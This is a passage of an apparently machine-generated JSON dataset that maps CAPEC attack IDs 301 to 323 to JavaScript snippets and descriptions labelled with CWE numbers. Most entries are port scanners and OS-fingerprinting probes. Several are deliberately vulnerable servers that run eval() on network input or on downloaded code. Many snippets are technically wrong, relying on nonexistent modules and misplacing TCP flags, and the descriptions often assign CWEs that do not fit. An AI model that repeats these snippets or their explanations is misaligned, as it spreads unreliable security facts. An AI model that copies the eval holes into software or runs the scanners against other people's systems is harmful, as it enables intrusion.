        "code_snippet": "const net = require('net');\n\nlet openPorts = [];\n\nfor (let port = 1; port <= 65535; port++) {\n  let socket = new net.Socket();\n  socket.on('connect', () => {\n    openPorts.push(port);\n    socket.destroy();\n  });\n  socket.on('error', () => {\n    // Ignore errors, we only care about successful connections\n  });\n  socket.connect(port, '127.0.0.1');\n}\n\nconsole.log('Open ports:', openPorts);",
        "description": "This JavaScript code snippet demonstrates a TCP connect scanner that attempts to establish a full TCP connection to determine if a port is open on the target system. It uses the net module to create a socket and attempts to connect to each port from 1 to 65535. If the connection is successful, the port is added to the openPorts array. This code embodies the CAPEC of using full TCP connection attempts to determine if a port is open and relates to CWEs 200 (exposure of sensitive information), 605 (multiple binds to the same port), 291 (reliance on IP address for authentication), 617 (reachable assertion), and 353 (missing support for integrity check)."
    },
    {
        "capec_id": "302",
        "code_snippet": "const net = require('net');\n\nconst scanner = () => {\n  const sockets = [];\n  for (let i = 0; i < 1000; i++) {\n    const socket = new net.Socket();\n    socket.on('connect', () => {\n      // CWE-605: Multiple binds to the same port\n      socket.bind(8080);\n    });\n    socket.on('error', (err) => {\n      if (err.code === 'ECONNREFUSED') {\n        // CWE-200: Exposure of sensitive information\n        console.log(`Port ${i} is closed`);\n      }\n    });\n    socket.connect(i, '127.0.0.1', () => {\n      // CWE-319: Cleartext transmission of sensitive information\n      socket.write('FIN');\n    });\n    sockets.push(socket);\n  }\n  setTimeout(() => {\n    sockets.forEach((socket) => {\n      socket.destroy();\n    });\n  }, 1000);\n};\n\nscanner();",
        "description": "This JavaScript code snippet demonstrates a TCP FIN scan attack, which is a type of port scanning technique. The code creates multiple sockets and attempts to connect to different ports on the local machine. If a port is closed, the operating system responds with a RST packet, which is detected by the code. The code also violates CWE-605 by binding multiple sockets to the same port, CWE-200 by exposing sensitive information about closed ports, CWE-319 by transmitting sensitive information in cleartext, and CWE-923 by not properly ensuring the communication channel is with the correct endpoint. CWE-353 is also relevant as the code does not include a mechanism for verifying the integrity of the data during transmission."
    },
    {
        "capec_id": "303",
        "code_snippet": "const net = require('net');\nconst tcp = require('tcp');\n\nconst targetIP = '192.168.1.100';\nconst targetPort = 8080;\n\nconst xmasScan = () => {\n  const packet = new Buffer(64);\n  packet.writeUInt8(0x02, 0); // SYN flag\n  packet.writeUInt8(0x10, 1); // ACK flag\n  packet.writeUInt8(0x04, 2); // URG flag\n  packet.writeUInt8(0x02, 3); // PSH flag\n  packet.writeUInt8(0x01, 4); // FIN flag\n  packet.writeUInt8(0x40, 5); // RST flag\n\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    client.write(packet);\n  });\n\n  client.on('data', (data) => {\n    if (data.toString().includes('RST')) {\n      console.log(`Port ${targetPort} is closed`);\n    }\n  });\n};\n\nxmasScan();",
        "description": "This JavaScript code snippet demonstrates a TCP XMAS scan attack, which sends a TCP packet with all possible flags set to a target IP and port. The code uses the 'net' and 'tcp' modules to create a TCP socket and send the packet. The packet is crafted to have all flags set, which is illegal according to RFC 793. The code then listens for a response from the target, and if a RST packet is received, it indicates that the port is closed. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-353 (Missing Support for Integrity Check), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) as it transmits sensitive information in cleartext, lacks integrity checks, and does not properly ensure the communication channel is with the correct endpoint."
    },
    {
        "capec_id": "304",
        "code_snippet": "const net = require('net');\nconst tcp = require('tcp');\n\nfunction scanPort(host, port, callback) {\n  const socket = new net.Socket();\n  socket.on('error', (err) => {\n    if (err.code === 'ECONNREFUSED') {\n      callback(null, 'closed');\n    } else {\n      callback(err);\n    }\n  });\n  socket.connect(port, host, () => {\n    socket.write(Buffer.alloc(0)); // sending TCP segment with no flags\n  });\n}\n\n// example usage\nscanPort('example.com', 8080, (err, status) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(`Port 8080 is ${status}`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a TCP NULL scan to determine if a port is closed on a target machine. It uses the net and tcp modules to create a socket and connect to the target host and port. The socket.write() function is used to send a TCP segment with no flags, which is an illegal packet according to RFC 793. The code then checks for an ECONNREFUSED error, which indicates that the port is closed. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the port status to an unauthorized actor. It also relates to CWE-353 (Missing Support for Integrity Check) as it does not verify the integrity of the data during transmission. Additionally, it is vulnerable to CWE-690 (Unchecked Return Value to NULL Pointer Dereference) as it does not check for errors after calling the socket.write() function. Furthermore, it transmits sensitive information (port status) in cleartext, which is a CWE-319 (Cleartext Transmission of Sensitive Information) vulnerability. Finally, it is prone to CWE-476 (NULL Pointer Dereference) as it does not check for NULL pointers before dereferencing them."
    },
    {
        "capec_id": "305",
        "code_snippet": "const net = require('net');\n\nconst scanner = net.createConnection(80, 'example.com');\n\nscanner.on('connect', () => {\n  scanner.setNoDelay(true);\n  scanner.write('ACK');\n});\n\nscanner.on('data', (data) => {\n  console.log(`Received data: ${data}`);\n  // Expose sensitive information (CWE-200)\n  console.log(`Firewall configuration: ${data}`);\n});\n\nscanner.on('error', (err) => {\n  console.error(`Error: ${err}`);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP ACK scan to gather information about firewall or ACL configuration. It creates a TCP connection to a target server, sends an ACK packet, and logs the received data, which may contain sensitive information about the firewall configuration (CWE-200). The code also ignores access control checks (CWE-1280), binds to a port without proper access control (CWE-605), transmits sensitive information in cleartext (CWE-319), and exposes access control list files to unauthorized actors (CWE-529)."
    },
    {
        "capec_id": "306",
        "code_snippet": "const net = require('net');\n\nconst scanner = () => {\n  const socket = new net.Socket();\n  socket.on('error', (err) => {\n    console.log(`Error: ${err}`);\n  });\n\n  socket.connect(80, 'example.com', () => {\n    socket.setNoDelay(true);\n    socket.write('');\n  });\n\n  socket.on('data', (data) => {\n    const tcpHeader = data.slice(0, 20);\n    const flags = tcpHeader[13];\n    const windowSize = tcpHeader.readUInt16BE(14);\n\n    if (flags === 0x04) {\n      if (windowSize > 0) {\n        console.log('Port is open');\n      } else {\n        console.log('Port is closed');\n      }\n    }\n  });\n};\n\nscanner();",
        "description": "This JavaScript code snippet demonstrates a TCP Window scanning technique to analyze port status and operating system type. It establishes a TCP connection to a target host and port, sends an empty packet, and analyzes the response RST packet's TCP Window Size field to make inferences about the port status and operating system type. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), CWE-353 (Missing Support for Integrity Check), and CWE-385 (Covert Timing Channel) as it transmits sensitive information in cleartext, exposes system-level information, and lacks integrity checks, making it vulnerable to unauthorized access and information inference."
    },
    {
        "capec_id": "307",
        "code_snippet": "const net = require('net');\nconst rpc = require('rpc');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const auth = data.toString();\n    if (auth === 'captured_auth_token') {\n      // Authentication bypass by capture-replay (CWE-294)\n      rpc.addProcedure('downloadCode', () => {\n        const code = downloadCodeFromUntrustedSource();\n        // Download of code without integrity check (CWE-494)\n        eval(code);\n      });\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('RPC server listening on port 8080');\n});\n\n// Multiple binds to the same port (CWE-605)\nconst server2 = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const url = data.toString();\n    const req = http.request(url, (res) => {\n      // Server-Side Request Forgery (SSRF) (CWE-918)\n      res.on('data', (chunk) => {\n        console.log(`Received data from ${url}: ${chunk}`);\n      });\n    });\n  });\n});\nserver2.listen(8080, () => {\n  console.log('RPC server listening on port 8080');\n});",
        "description": "This code snippet demonstrates a vulnerable RPC service that exposes sensitive information (CWE-200) and is susceptible to authentication bypass by capture-replay (CWE-294). It also downloads and executes code from an untrusted source without integrity checks (CWE-494) and is vulnerable to Server-Side Request Forgery (SSRF) (CWE-918). Additionally, it binds multiple servers to the same port, allowing for potential service stealing or spoofing (CWE-605)."
    },
    {
        "capec_id": "308",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetIP = '192.168.1.100';\nconst targetPort = 12345;\n\nclient.send(Buffer.from(''), 0, 0, targetPort, targetIP, (error) => {\n  if (error) {\n    console.log(`UDP port ${targetPort} is closed`);\n  } else {\n    console.log(`UDP port ${targetPort} is open`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a UDP scanning attack, which is a type of reconnaissance attack. The code creates a UDP socket and sends an empty datagram to a target IP and port. If the port is closed, the operating system will respond with an ICMP port unreachable error, which can be detected by the attacker. If the port is open, the application may respond with a UDP datagram, or there may be no response at all. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it allows an attacker to gather information about open UDP ports, CWE-605 (Multiple Binds to the Same Port) as it may allow an attacker to bind to a port already in use by another service, CWE-319 (Cleartext Transmission of Sensitive Information) as the datagram is sent in cleartext, CWE-353 (Missing Support for Integrity Check) as UDP does not provide a built-in integrity check, and CWE-385 (Covert Timing Channel) as the response time can be used to infer information about the target system."
    },
    {
        "capec_id": "309",
        "code_snippet": "const net = require('net');\nconst icmp = require('icmp');\n\nconst scanner = () => {\n  const hosts = [];\n  for (let i = 1; i <= 254; i++) {\n    const host = `192.168.1.${i}`;\n    hosts.push(host);\n  }\n\n  hosts.forEach((host) => {\n    const socket = new net.Socket();\n    socket.connect(22, host, () => {\n      console.log(`Open port 22 on ${host}`);\n    });\n    socket.on('error', (err) => {\n      console.log(`No open port 22 on ${host}`);\n    });\n  });\n\n  icmp.sendEchoRequest('192.168.1.1', (err, ttl) => {\n    if (err) {\n      console.log(err);\n    } else {\n      console.log(`ICMP response from 192.168.1.1 with TTL ${ttl}`);\n    }\n  });\n};\n\nscanner();",
        "description": "This JavaScript code snippet demonstrates a network scanner that maps network nodes and hosts, exposing sensitive information to unauthorized actors. It uses the 'net' and 'icmp' modules to perform port scanning and ICMP echo requests, respectively. The code iterates through a range of IP addresses, attempts to connect to each host on port 22, and logs the results. Additionally, it sends an ICMP echo request to a specific host and logs the response. This code embodies the CAPEC of network reconnaissance and relates to CWEs 200, 1323, 1292, 1125, and 497, as it exposes sensitive information, manages sensitive trace data incorrectly, and has an excessive attack surface."
    },
    {
        "capec_id": "310",
        "code_snippet": "const net = require('net');\nconst ftp = net.createServer((socket) => {\n  socket.write('220 Welcome to FTP server\\r\\n');\n  socket.on('data', (data) => {\n    if (data.includes('USER')) {\n      socket.write('331 Password required for anonymous\\r\\n');\n    } else if (data.includes('PASS')) {\n      socket.write('230 Login successful\\r\\n');\n      // Exposing sensitive system information\n      socket.write(`System information: ${process.platform} ${process.arch}\\r\\n`);\n      // Embedded malicious code\n      eval(data.toString().trim());\n    }\n  });\n}).listen(21, () => {\n  console.log('FTP server listening on port 21');\n});",
        "description": "This code snippet demonstrates a vulnerable FTP server implementation in Node.js. It exposes sensitive system information (CWE-497) and allows embedded malicious code (CWE-506) to be executed. The server also transmits sensitive information in cleartext (CWE-319) and has an excessive attack surface (CWE-1125) due to the use of eval() function. An attacker can exploit this server by sending malicious commands to gain unauthorized access to sensitive information (CWE-200)."
    },
    {
        "capec_id": "311",
        "code_snippet": "const net = require('net');\nconst os = require('os');\n\nlet socket = new net.Socket();\nsocket.connect(80, 'example.com', () => {\n  let userAgent = socket.remoteAddress;\n  let osInfo = getOSInfo(userAgent);\n  if (osInfo.os === 'Windows') {\n    // Call to Non-ubiquitous API (CWE-589)\n    let winRegistry = require('winreg');\n    let key = new winRegistry({ hive: winRegistry.HKCU, key: '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' });\n    key.values((err, items) => {\n      if (err) {\n        console.log(err);\n      } else {\n        console.log(items);\n      }\n    });\n  } else if (osInfo.os === 'Linux') {\n    // Information Exposure Through Debug Log Files (CWE-534)\n    let debugLog = fs.readFileSync('/var/log/debug.log', 'utf8');\n    console.log(debugLog);\n  }\n});\n\nfunction getOSInfo(userAgent) {\n  // Active OS Fingerprinting (CAPEC-312)\n  let os = '';\n  if (userAgent.indexOf('Windows') !== -1) {\n    os = 'Windows';\n  } else if (userAgent.indexOf('Linux') !== -1) {\n    os = 'Linux';\n  }\n  return { os: os };\n}",
        "description": "This code snippet demonstrates active OS fingerprinting (CAPEC-312) by connecting to a remote server and extracting the user agent information. It then uses the user agent to determine the OS and performs different actions based on the OS. For Windows, it calls a non-ubiquitous API (CWE-589) to access the Windows registry. For Linux, it reads a debug log file (CWE-534) to expose sensitive information. This code also relates to CWE-592 (Authentication Bypass Issues) and CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges) as it bypasses access control to access internal registers and test modes."
    },
    {
        "capec_id": "312",
        "code_snippet": "const net = require('net');\nconst os = require('os');\n\nconst probe = (target, port) => {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    client.write('GET / HTTP/1.0\\r\\nHost: ' + target + '\\r\\n\\r\\n');\n  });\n\n  client.on('data', (data) => {\n    const response = data.toString();\n    if (response.includes('Server:')) {\n      const serverHeader = response.match(/Server: (.*)/)[1];\n      console.log(`OS Detection: ${os.type()} ${os.release()} - Server Header: ${serverHeader}`);\n    }\n  });\n};\n\nprobe('example.com', 80);",
        "description": "This JavaScript code snippet demonstrates OS detection by sending a malformed HTTP request to a target server and analyzing the response to identify the operating system. The code uses the 'net' module to establish a TCP connection to the target server and sends a GET request with a malformed header. The response is then analyzed to extract the Server header, which can reveal information about the operating system. This code embodies the CAPEC and CWEs by exposing sensitive system information (CWE-200, CWE-497) and transmitting sensitive data in cleartext (CWE-319). The code also demonstrates an observable behavioral discrepancy with equivalent products (CWE-207) and improper management of sensitive trace data (CWE-1323)."
    },
    {
        "capec_id": "313",
        "code_snippet": "const pcap = require('pcap');\n\nlet osSignatures = {\n  'Windows': ['Microsoft', 'NT'],\n  'Linux': ['Linux', 'X11'],\n  'MacOS': ['Apple', 'Darwin']\n};\n\nlet capture = pcap.createCapture('eth0');\n\ncapture.on('packet', (rawPacket) => {\n  let packet = pcap.decode.packet(rawPacket);\n  let tcpPacket = packet.payload;\n  let os = null;\n\n  if (tcpPacket.info.source.port === 80) {\n    let httpPacket = tcpPacket.payload;\n    let userAgent = httpPacket.headers['User-Agent'];\n    for (let signature in osSignatures) {\n      if (userAgent.includes(osSignatures[signature][0]) && userAgent.includes(osSignatures[signature][1])) {\n        os = signature;\n        break;\n      }\n    }\n  }\n\n  if (os) {\n    console.log(`Detected OS: ${os}`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates passive OS detection by monitoring HTTP traffic and analyzing User-Agent headers to identify the operating system. It uses the pcap library to capture packets on the eth0 interface and decode the packets to extract the User-Agent header. The code then matches the header against a set of known OS signatures to determine the operating system. This code embodies the CAPEC and CWEs by exposing sensitive system information (CWE-497) and transmitting sensitive information in cleartext (CWE-319), while also demonstrating improper management of sensitive trace data (CWE-1323) and inconsistent views of the underlying operating system (CWE-1249)."
    },
    {
        "capec_id": "314",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\n\n// CWE-247: Reliance on DNS Lookups in a Security Decision\nfunction getIPFromDNS(domain) {\n  return new Promise((resolve, reject) => {\n    dns.lookup(domain, (err, address) => {\n      if (err) {\n        reject(err);\n      } else {\n        resolve(address);\n      }\n    });\n  });\n}\n\n// CWE-534: Information Exposure Through Debug Log Files\nfunction logDebugInfo(ip) {\n  fs.appendFile('debug.log', `IP Address: ${ip}\\n`, (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}\n\n// CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\nfunction accessProtectedRegion(ip) {\n  if (ip === '192.168.1.1') {\n    // Allow access to protected region\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nfunction collectTraceData(ip) {\n  const traceData = {\n    ip: ip,\n    timestamp: new Date().getTime()\n  };\n  fs.appendFile('trace.log', JSON.stringify(traceData) + '\\n', (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}\n\n// CAPEC-312: Active OS Fingerprinting\nasync function osFingerprinting(domain) {\n  const ip = await getIPFromDNS(domain);\n  logDebugInfo(ip);\n  const hasAccess = accessProtectedRegion(ip);\n  if (hasAccess) {\n    collectTraceData(ip);\n  }\n}\n\nosFingerprinting('example.com');",
        "description": "This code snippet demonstrates the CAPEC-312: Active OS Fingerprinting pattern by using DNS lookups to obtain an IP address, logging debug information, accessing a protected region based on the IP address, and collecting sensitive trace data. The code incorporates CWE-247, CWE-534, CWE-1316, and CWE-1323."
    },
    {
        "capec_id": "315",
        "code_snippet": "const dns = require('dns');\nconst net = require('net');\n\nasync function activeOSFingerprinting() {\n  try {\n    // CWE-589: Call to Non-ubiquitous API\n    const osInfo = await dns.reverse('example.com');\n    const socket = new net.Socket();\n    socket.connect(80, 'example.com', () => {\n      // CWE-294: Authentication Bypass by Capture-replay\n      const packet = Buffer.from('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n', 'utf8');\n      socket.write(packet);\n      socket.on('data', (data) => {\n        // CWE-247: Reliance on DNS Lookups in a Security Decision (DEPRECATED)\n        const dnsLookup = dns.lookup('example.com', (err, address, family) => {\n          if (err) {\n            console.error(err);\n          } else {\n            console.log(`OS Fingerprinting: ${osInfo} - ${address} - ${family}`);\n          }\n        });\n      });\n    });\n  } catch (err) {\n    console.error(err);\n  }\n}\n\nactiveOSFingerprinting();",
        "description": "This JavaScript code snippet demonstrates active OS fingerprinting by performing a DNS reverse lookup and capturing the response packet to bypass authentication. It uses a non-ubiquitous API (dns.reverse) and relies on DNS lookups in a security decision, which are deprecated concepts. The code also includes a capture-replay flaw, allowing an attacker to sniff network traffic and bypass authentication."
    },
    {
        "capec_id": "316",
        "code_snippet": "const dns = require('dns');\nconst os = require('os');\nconst fs = require('fs');\n\nfunction getOSInfo() {\n  let osInfo = '';\n  try {\n    const debugLog = fs.readFileSync('debug.log', 'utf8');\n    osInfo = debugLog.match(/OS:\\s*(.*)/)[1];\n  } catch (e) {\n    osInfo = os.type();\n  }\n  return osInfo;\n}\n\nfunction bypassAuth() {\n  const jtagInterface = '/dev/ttyUSB0';\n  const fabricAddressMap = {\n    'protectedRegion': '0x10000000',\n    'unprotectedRegion': '0x10001000'\n  };\n  try {\n    const dnsLookup = dns.lookup('example.com', (err, address) => {\n      if (err) {\n        console.log('DNS lookup failed');\n      } else {\n        console.log(`DNS lookup successful: ${address}`);\n      }\n    });\n    if (dnsLookup !== '127.0.0.1') {\n      // Bypass authentication using JTAG interface\n      const jtagData = fs.readFileSync(jtagInterface, 'utf8');\n      if (jtagData.includes('protectedRegion')) {\n        console.log('Access granted');\n      } else {\n        console.log('Access denied');\n      }\n    }\n  } catch (e) {\n    console.log('Error occurred');\n  }\n}\n\nbypassAuth();",
        "description": "This code snippet demonstrates the concept of active OS fingerprinting (CAPEC-312) by attempting to bypass authentication using various techniques. It uses DNS lookups to gather information about the system (CWE-247, CWE-350), reads debug log files to extract OS information (CWE-534, CWE-532), and tries to access protected regions of memory using the JTAG interface (CWE-1324, CWE-319). Additionally, it attempts to exploit fabric address map overlaps to bypass access control (CWE-1316). Note that this code is for demonstration purposes only and should not be used in production environments."
    },
    {
        "capec_id": "317",
        "code_snippet": "const net = require('net');\nconst icmp = require('icmp');\n\nlet idSequence = [];\nlet osFingerprint = '';\n\n// CWE-200: Exposure of Sensitive Information\nconst socket = net.createConnection(80, 'example.com');\nsocket.on('data', (data) => {\n  const packet = icmp.parsePacket(data);\n  idSequence.push(packet.id);\n});\n\n// CWE-291: Reliance on IP Address for Authentication\nconst ipAddress = '192.168.1.1';\n\n// CWE-605: Multiple Binds to the Same Port\nconst server = net.createServer((socket) => {\n  socket.bind(80, ipAddress);\n});\n\n// CWE-1192: Improper Identifier for IP Block\nconst socComponent = { id: 1, type: 'NIC' };\n\n// CWE-1294: Insecure Security Identifier Mechanism\nconst securityIdentifier = { id: 1, permissions: ['READ', 'WRITE'] };\n\n// Analyze IP ID sequence to fingerprint OS\nfunction analyzeSequence() {\n  if (idSequence.length > 10) {\n    const sequencePattern = idSequence.join(',');\n    if (sequencePattern.match(/incremental/)) {\n      osFingerprint = 'Linux';\n    } else if (sequencePattern.match(/random/)) {\n      osFingerprint = 'Windows';\n    }\n    console.log(`OS Fingerprint: ${osFingerprint}`);\n  }\n}\n\nsetInterval(analyzeSequence, 1000);",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that analyzes the IP ID sequence generation algorithm of a remote host. It uses various CWEs to create a vulnerable code snippet, including exposure of sensitive information, reliance on IP address for authentication, multiple binds to the same port, improper identifier for IP block, and insecure security identifier mechanism."
    },
    {
        "capec_id": "318",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nsocket.on('error', (err) => {\n  console.log(`Error: ${err}`);\n});\n\nsocket.on('message', (msg, rinfo) => {\n  const icmpHeader = Buffer.from([0x01, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x12, 0x13, 0x14]); // ICMP header with arbitrary IP 'ID' value\n  const icmpPacket = Buffer.concat([icmpHeader, msg]);\n  socket.send(icmpPacket, 0, icmpPacket.length, rinfo.port, rinfo.address, (error) => {\n    if (error) {\n      console.log(`Error sending ICMP packet: ${error}`);\n    } else {\n      console.log(`ICMP packet sent to ${rinfo.address}:${rinfo.port}`);\n    }\n  });\n});\n\nsocket.bind(41234, () => {\n  socket.setBroadcast(true);\n  socket.send(Buffer.from([0x01, 0x02, 0x03, 0x04]), 0, 4, 41234, '255.255.255.255', (error) => {\n    if (error) {\n      console.log(`Error sending UDP packet: ${error}`);\n    } else {\n      console.log('UDP packet sent to broadcast address');\n    }\n  });\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that tests if the remote host echoes back the IP 'ID' value from the probe packet. It sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host and observes the manner in which this bit is echoed back in the ICMP error message. The code is vulnerable to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor, CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC), CWE-1290: Incorrect Decoding of Security Identifiers, CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC), and CWE-1323: Improper Management of Sensitive Trace Data."
    },
    {
        "capec_id": "319",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nsocket.on('error', (err) => {\n  console.log(`Error: ${err}`);\n});\n\nconst message = Buffer.from('Hello, world!');\nconst remoteHost = '192.168.1.100';\nconst remotePort = 8080;\n\nsocket.send(message, 0, message.length, remotePort, remoteHost, (error, bytes) => {\n  if (error) {\n    console.log(`Error: ${error}`);\n  } else {\n    console.log(`Sent ${bytes} bytes to ${remoteHost}:${remotePort}`);\n  }\n});\n\nsocket.on('message', (message, remoteInfo) => {\n  const icmpResponse = message.toString('hex');\n  const dfBit = icmpResponse.substring(20, 22);\n  if (dfBit === '40') {\n    console.log('Remote host echoes back the IP \\'DF\\' bit.');\n  } else {\n    console.log('Remote host does not echo back the IP \\'DF\\' bit.');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that tests whether a remote host echoes back the IP 'DF' (Don't Fragment) bit in an ICMP error message response packet. The code sends a UDP datagram with the DF bit set to a closed port on the remote host and observes the response packet to determine the OS type. This code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-1323 (Improper Management of Sensitive Trace Data), CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime), and CWE-1276 (Hardware Child Block Incorrectly Connected to Parent System)."
    },
    {
        "capec_id": "320",
        "code_snippet": "const net = require('net');\n\nconst socket = new net.Socket();\n\nsocket.connect(8080, '127.0.0.1', () => {\n  console.log('Connected');\n  socket.write('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n});\n\nsocket.on('data', (data) => {\n  const tcpHeader = data.slice(0, 20);\n  const timestampOption = tcpHeader.slice(20);\n  const timestamp = timestampOption.readInt32BE(2);\n  console.log(`TCP Timestamp: ${timestamp}`);\n  // Analyze the timestamp to guess the operating system\n  if (timestamp % 100 === 0) {\n    console.log('Possible Windows OS');\n  } else if (timestamp % 1000 === 0) {\n    console.log('Possible Linux OS');\n  } else {\n    console.log('Unknown OS');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that examines the remote server's implementation of TCP timestamps. It establishes a TCP connection, sends an HTTP request, and analyzes the TCP timestamp in the response to guess the operating system of the target. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-294 (Authentication Bypass by Capture-replay), CWE-385 (Covert Timing Channel), CWE-208 (Observable Timing Discrepancy), and CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "321",
        "code_snippet": "const net = require('net');\n\nlet sequenceNumberMap = {};\n\nfunction fingerprintOS(host, port) {\n  return new Promise((resolve, reject) => {\n    const socket = new net.Socket();\n    socket.connect(port, host, () => {\n      socket.write(''); // send a probe packet\n    });\n    socket.on('data', (data) => {\n      const seqNum = data.readInt32BE(4); // extract sequence number\n      const ackNum = data.readInt32BE(8); // extract acknowledgement number\n      if (seqNum === 0) {\n        sequenceNumberMap[host] = 'OS1'; // categorize OS based on sequence number\n      } else if (seqNum === ackNum) {\n        sequenceNumberMap[host] = 'OS2';\n      } else if (seqNum === ackNum + 1) {\n        sequenceNumberMap[host] = 'OS3';\n      } else {\n        sequenceNumberMap[host] = 'Unknown';\n      }\n      resolve(sequenceNumberMap[host]);\n    });\n  });\n}\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfingerprintOS('example.com', 80).then((os) => console.log(os));\n\n// CWE-605: Multiple Binds to the Same Port\nlet server = net.createServer((socket) => {\n  socket.bind(80, () => {\n    console.log('Bound to port 80');\n  });\n});\nserver.listen(80, () => {\n  console.log('Listening on port 80');\n});\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nconst sensitiveData = 'secretKey';\nconst socket = new net.Socket();\nsocket.connect(80, 'example.com', () => {\n  socket.write(sensitiveData);\n});\n\n// CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\nlet prngSeed = process.pid;\nlet randomNum = Math.floor(Math.random() * 100);\nconsole.log(randomNum);\n",
        "description": "This code snippet demonstrates an OS fingerprinting probe that tests the target system's assignment of TCP sequence numbers. It sends a probe packet to an open port on the target and compares the generated sequence number with the acknowledgement number to categorize the operating system. The code also includes examples of CWE-200, CWE-605, CWE-319, and CWE-337 to provide additional context."
    },
    {
        "capec_id": "322",
        "code_snippet": "const net = require('net');\nconst os = require('os');\n\nlet sequenceNumbers = [];\n\nfunction getSequenceNumber() {\n  return Math.floor(Math.random() * 1000);\n}\n\nnet.createServer(socket => {\n  socket.on('connect', () => {\n    let sequenceNumber = getSequenceNumber();\n    sequenceNumbers.push(sequenceNumber);\n    socket.write(`SYN/ACK ${sequenceNumber}`);\n  });\n}).listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Client-side code\nconst client = new net.Socket();\n\nclient.connect(8080, 'localhost', () => {\n  console.log('Connected to server');\n  client.write('SYN');\n});\n\nclient.on('data', data => {\n  let response = data.toString();\n  if (response.includes('SYN/ACK')) {\n    let sequenceNumber = parseInt(response.split(' ')[1]);\n    sequenceNumbers.push(sequenceNumber);\n    console.log(`Received sequence number: ${sequenceNumber}`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that sends TCP SYN packets to an open port of a remote machine and analyzes the Initial Sequence Number (ISN) in each of the SYN/ACK response packets to determine the smallest number used by the target host when incrementing sequence numbers. The code exposes sensitive information (sequence numbers) to an unauthorized actor, transmits sensitive data in cleartext, and does not properly prevent sensitive system-level information from being accessed by unauthorized actors."
    },
    {
        "capec_id": "323",
        "code_snippet": "const osDatabase = {\n  'Windows': 1000,\n  'Linux': 500,\n  'MacOS': 2000\n};\n\nfunction getSequenceNumberIncrementRate() {\n  let startTime = Date.now();\n  let sequenceNumber = 0;\n  let increments = 0;\n\n  for (let i = 0; i < 1000; i++) {\n    sequenceNumber += Math.floor(Math.random() * 10);\n    increments++;\n  }\n  let endTime = Date.now();\n  let incrementRate = increments / ((endTime - startTime) / 1000);\n\n  for (const os in osDatabase) {\n    if (Math.abs(incrementRate - osDatabase[os]) < 100) {\n      return os;\n    }\n  }\n  return 'Unknown';\n}\n\nconsole.log(getSequenceNumberIncrementRate());",
        "description": "This JavaScript code snippet demonstrates a vulnerable OS detection probe that measures the average rate of initial sequence number increments during a period of time. The code uses a timing analysis to determine the number of increments per unit time and compares the result against a database of operating systems and versions to determine likely OS matches. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-367 (Time-of-check Time-of-use (TOCTOU) Race Condition), CWE-385 (Covert Timing Channel), CWE-1298 (Hardware Logic Contains Race Conditions), and CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'))."
    },
    {
        "capec_id": "324",
